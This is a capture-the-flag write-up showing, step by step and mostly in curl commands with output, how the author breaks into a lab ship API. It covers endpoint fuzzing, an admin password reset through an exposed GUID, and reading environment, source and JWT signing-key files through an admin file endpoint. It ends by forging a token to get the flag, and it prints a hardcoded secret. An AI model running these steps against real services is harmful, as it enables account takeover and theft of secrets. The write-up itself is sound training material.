## U.S.A.

Points: 5

We're given address http://universal-ship-api.cns-jv.tcc/. Quick nmap scan shows that only port 80 is open.
Root serves just `{"msg":"Naval ship API version 1.0"}` JSON, we'll have to discover the rest.

`ffuf -u http://universal-ship-api.cns-jv.tcc/FUZZ -w /usr/share/wordlists/dirb/common.txt`

discover paths `/api` and `/docs`. Visiting `/api` will provide `/api/v1/user` and `/api/v1/admin` paths. Unfortunately `/docs` need authenticated access so we'll have to keep searching.

`/api/v1/user` paths return 401 for everything, but `/api/v1/admin` returns 404 so I continued with scanning that path,
`ffuf -u http://universal-ship-api.cns-jv.tcc/api/v1/admin/FUZZ -w /usr/share/wordlists/dirb/common.txt`
yields endpoint `/api/v1/admin/file`.

At this point I was stuck for some time as it wasn't clear to me where to go from here since none of the endpoints disovered so far seemed usable. After a while I realized that I should conduct a scan with other methods as well.
And indeed scanning the `/api/v1/user` endpoint with
`ffuf -X POST -u http://universal-ship-api.cns-jv.tcc/api/v1/user/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200-299,301,302,307,401,403,422,500`
yielded `/api/v1/user/signup` and `/api/v1/user/login` endpoints.
Great! Now I should be able to create a user and authenticate.

Playing with curl for a few minutes revealed the expected format - `signup` expects a JSON with `email` and `password`, `login` expects form parameters `username` and `password` and returns a JWT token.

So:
`curl -v -XPOST http://universal-ship-api.cns-jv.tcc/api/v1/user/signup -H 'content-type: application/json' --data '{"email": "xyz@mail.com", "password": "pass1"}'`
responds with 201 Created.


`curl -v -XPOST http://universal-ship-api.cns-jv.tcc/api/v1/user/login -F username="xyz@mail.com" -F password="pass1"`
-> `{"access_token":"eyJhbGciOiJSUzM4NCIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjk3NzM3NjIzLCJpYXQiOjE2OTcwNDY0MjMsInN1YiI6IjIiLCJhZG1pbiI6ZmFsc2UsImd1aWQiOiJjOThmN2FlMC1kNDY0LTQ1MTktYjE3MS1mYzIwOWRlN2FlODYifQ.RXOIrvoF6j6kBLkdWy_f8TxQoPCn3Tf0mZndOqsb0I4QLe0smFye9T99mNa1k5HzKE0uIawgl36Q-Ertlt4cMeDmToMuDD_ZqUy7nGa0NJhwHqykUswUKotvA2Bzt60AM487rtWrzciSOtH01lrE3O-ZK8XDBktzP1oBkYfAwF-K5YuBlXD4yShcAd0Wss_iKeEPOEFNEnPkgUCgmKwuITW2J4l_Fw_LoBNKhejIwBsfxpMKA8_Ot0pF3dkfxVxPhvJVekwaQ6ze15hBojuz3ujw3tA4j-8dp6rxoFoYDjTk6QIE9KLk1a4ip4oCkb9qxfkBTin_JHZFW2WMGZwPmOlIuLf-tsb-bFzelAPMBM6miXNGXKO8VwtcPQKhq1mpyBMZjuhjYWWL2fJBF0r1ScQzlO_LCWlCgoFK2O2HOKQvmB8Lw5flkrYUj7VGxIp4GF6cGE6JnEPdRZlx7bUxAIWvKftsshbTuzp0gvRRqB_ka94JEQUxkEZMQjjxZ_Cck1hiYMVb-2sYEddFmYtoAL-6ERt7xUOlS6XsCpkth7-YVVGK6rFOJhWCcAM3mJ7gGcbpDGBQTvdPXoZCfLx1nKGB-75uh-DW-lF-JG1LpIoIZkdXt-h5UHfTvvK4RTUjJ6iZymwg6OiJXoSRFHO4LOw03kkQEIpRh_A7KMGKU44","token_type":"bearer"}`

I saved the token to a variable for more comfortable work:
`curl -v -XPOST http://universal-ship-api.cns-jv.tcc/api/v1/user/login -F username="xyz@mail.com" -F password="pass1" | jq '.access_token' -r | read TOKEN`

Now we can access the authenticated endpoints, starting with the `/docs` to check whether there are more endpoints:
`curl -v -H "authorization: bearer $TOKEN" http://universal-ship-api.cns-jv.tcc/docs` and then `/openapi.json` will show that there are also endpoints:
`/api/v1/user/updatepassword` for POST method and `/api/v1/admin/getFlag` for PUT.

As expected, trying the `getFlag` will not give us anything (yet) as I'm just an ordinary user.

Let's see - perhaps I can find out who's admin and get/change his password?

`curl -v -H "authorization: bearer $TOKEN" http://universal-ship-api.cns-jv.tcc/api/v1/user/1`
-> 
`{"guid":"8f812b13-51a7-4ddc-8f99-84913b78be2f","email":"admin@local.tcc","date":null,"time_created":1690796892351,"admin":true,"id":1}` (note that the GUID changes with appliance restarts)

`curl -v -H "authorization: bearer $TOKEN" -XPOST http://universal-ship-api.cns-jv.tcc/api/v1/user/updatepassword -H 'content-type: application/json' --data '{"guid": "8f812b13-51a7-4ddc-8f99-84913b78be2f"", "password": "pass1"}'`
-> 201 Created (y)

`curl -v -XPOST http://universal-ship-api.cns-jv.tcc/api/v1/user/login -F username="admin@local.tcc" -F password="pass1" | jq '.access_token' -r | read ADMIN_TOKEN`


And indeed I'm logged in as admin now:
`curl -v -H "authorization: bearer $ADMIN_TOKEN" http://universal-ship-api.cns-jv.tcc/api/v1/admin/`
-> `{"results":true}`

But considering we haven't used the `file` endpoint, I suppose it would be too easy if the `getFlag` endpoint would just return the flag now, right?
`curl -v -XPUT -H "authorization: bearer $ADMIN_TOKEN" http://universal-ship-api.cns-jv.tcc/api/v1/admin/getFlag`
-> `{"detail":"flag-read key missing from JWT"}`

Right. So I'll have to add the required key into JWT payload.
![alt text](img/jwt.png)
For that I'll need public and private keys.

Ok, let's see what the `file` endpoint does.  The documentation says that the `file` endpoint fetches a file from the server so I'll have to locate and fetch the files with the keys.

For convenience I wrapped the query in a function:
```
function _fetch {
	curl -v -H "authorization: bearer $ADMIN_TOKEN" -XPOST http://universal-ship-api.cns-jv.tcc/api/v1/admin/file -H 'content-type: application/json' --data "{\"file\": \"$1\"}" | jq -r '.file'
}
```

The app probably runs in a docker container as others and it will have PID 1 so I can check env of that:
`_fetch /proc/1/environ`
-> 
```
HOSTNAME=c3084a02d5edPYTHON_VERSION=3.10.13APP_MODULE=shipapi.main:appPWD=/appPORT=80PYTHON_SETUPTOOLS_VERSION=65.5.1TZ=Europe/PragueHOME=/home/appuserLANG=C.UTF-8VIRTUAL_ENV=/app/venvGPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696DPYTHONPATH=.HOST=0.0.0.0SHLVL=0PYTHON_PIP_VERSION=23.0.1VIRTUAL_ENV_PROMPT=(venv) PYTHON_GET_PIP_SHA256=45a2bb8bf2bb5eff16fdd00faef6f29731831c7c59bd9fc2bf1f3bed511ff1fePS1=(venv) PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/9af82b715db434abb94a0a6f3569f43e72157346/public/get-pip.pyPATH=/app/venv/bin:/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

It seems that the app code is located in `/app` and is called `shipapi`.

Let's see if I can fetch source codes
`_fetch /app/shipapi/main.py`
-> 
```python
import asyncio

from fastapi import FastAPI, APIRouter, Query, HTTPException, Request, Depends
from fastapi_contrib.common.responses import UJSONResponse
from fastapi import FastAPI, Depends, HTTPException, status
from fastapi.security import HTTPBasic, HTTPBasicCredentials
from fastapi.openapi.docs import get_swagger_ui_html
from fastapi.openapi.utils import get_openapi

from typing import Optional, Any
from pathlib import Path
from sqlalchemy.orm import Session

from shipapi.schemas.user import User
from shipapi.api.v1.api import api_router
from shipapi.appconfig.config import settings

from shipapi import deps
from shipapi import crud

app = FastAPI(title="Naval ship API", openapi_url=None, docs_url=None, redoc_url=None)
root_router = APIRouter(default_response_class=UJSONResponse)


@app.get("/", summary=" ", status_code=200, include_in_schema=False)
def root():
    """
    Root
    """
    return {"msg": "Naval ship API version 1.0"}


@app.get("/api", summary="List versions", status_code=200, include_in_schema=False)
def list_versions():
    """
    API versions
    """
    return {"endpoints": ["v1"]}


@app.get("/api/v1", summary="List v1 endpoints", status_code=200, include_in_schema=False)
def list_endpoints_v1():
    """
    API v1 Endpoints
    """
    return {"endpoints": ["user", "admin"]}


@app.get("/docs", summary="Documentation", include_in_schema=False)
async def get_documentation(
        current_user: User = Depends(deps.parse_token)
):
    return get_swagger_ui_html(openapi_url="/openapi.json", title="Naval ship API docs")


@app.get("/openapi.json", include_in_schema=False)
async def openapi(
        current_user: User = Depends(deps.parse_token)
):
    return get_openapi(title="Naval Ship API", version="1.0", routes=app.routes)


app.include_router(api_router, prefix=settings.API_V1_STR)
app.include_router(root_router)


def start():
    import uvicorn

    uvicorn.run(app, host="0.0.0.0", port=80, log_level="debug")


if __name__ == "__main__":
    import uvicorn

    uvicorn.run(app, host="0.0.0.0", port=80, log_level="debug")
```


yes, it's using `deps` so let's check that:


`_fetch /app/shipapi/deps.py`
->
```python
from typing import Generator, Optional

from fastapi import Depends, HTTPException, status
from jose import jwt, JWTError
from pydantic import BaseModel
from sqlalchemy.orm.session import Session

from shipapi.core.auth import oauth2_scheme
from shipapi.appconfig.config import settings
from shipapi.db.session import SessionLocal
from shipapi.models.user import User

class TokenData(BaseModel):
    username: Optional[str] = None

def get_db() -> Generator:
    db = SessionLocal()
    db.current_user_id = None
    try:
        yield db
    finally:
        db.close()


async def get_current_user(
    db: Session = Depends(get_db), token: str = Depends(oauth2_scheme)
) -> User:
    credentials_exception = HTTPException(
        status_code=status.HTTP_401_UNAUTHORIZED,
        detail="Could not validate credentials",
        headers={"WWW-Authenticate": "Bearer"},
    )
    try:
        payload = jwt.decode(
            token,
            settings.JWT_RSA_PUB,
            algorithms=[settings.ALGORITHM],
            options={"verify_aud": False},
        )
        username: str = payload.get("sub")
        if username is None:
            raise credentials_exception
        token_data = TokenData(username=username)
    except JWTError:
        raise credentials_exception

    user = db.query(User).filter(User.id == token_data.username).first()
    if user is None:
        raise credentials_exception
    return user

async def parse_token(
    token: str = Depends(oauth2_scheme)
) -> User:
    credentials_exception = HTTPException(
        status_code=status.HTTP_401_UNAUTHORIZED,
        detail="Could not validate credentials",
        headers={"WWW-Authenticate": "Bearer"},
    )
    try:
        payload = jwt.decode(
            token,
            settings.JWT_RSA_PUB,
            algorithms=[settings.ALGORITHM],
            options={"verify_aud": False},
        )

    except JWTError:
        raise credentials_exception
        
    return payload

```

and that is loading key material from config, so
	
`_fetch /app/shipapi/appconfig/config.py`
-> 
```python
from pydantic import AnyHttpUrl, BaseSettings, EmailStr, validator
from typing import List, Optional, Union

from enum import Enum


class Settings(BaseSettings):
    API_V1_STR: str = "/api/v1"

    JWT_RSA_KEY =  open('shipapi/appconfig/jwtsigning.key').read()
    JWT_RSA_PUB = open('shipapi/appconfig/jwtsigning.pub').read()
    ALGORITHM: str = "RS384"
#   We don't use symmetric cipher algo anymore
    JWT_SECRET: str = "TW!BMP9yVRiDEziTsekVoHZJFcXQgZf8"



    ACCESS_TOKEN_EXPIRE_MINUTES: int = 60 * 24 * 8
    CORS_ORIGINS: List[AnyHttpUrl] = []

    @validator("CORS_ORIGINS", pre=True)
    def assemble_cors_origins(cls, v: Union[str, List[str]]) -> Union[List[str], str]:
        if isinstance(v, str) and not v.startswith("["):
            return [i.strip() for i in v.split(",")]
        elif isinstance(v, (list, str)):
            return v
        raise ValueError(v)

    SQLALCHEMY_DATABASE_URI: Optional[str] = "sqlite:///navalship.db"

    class Config:
        case_sensitive = True
 

settings = Settings()

```

and that gives location of the information needed to inject the key into JWT:


`_fetch /app/shipapi/appconfig/jwtsigning.key > jwtsigning.key`
`_fetch /app/shipapi/appconfig/jwtsigning.pub > jwtsigning.pub`

these we can plug into the form and generate a JWT with `"flag-read": true` in payload and query the `getFlag` endpoint again:

`{"Flag":"FLAG{910P-iUeJ-Wwq1-i8L2}"}`
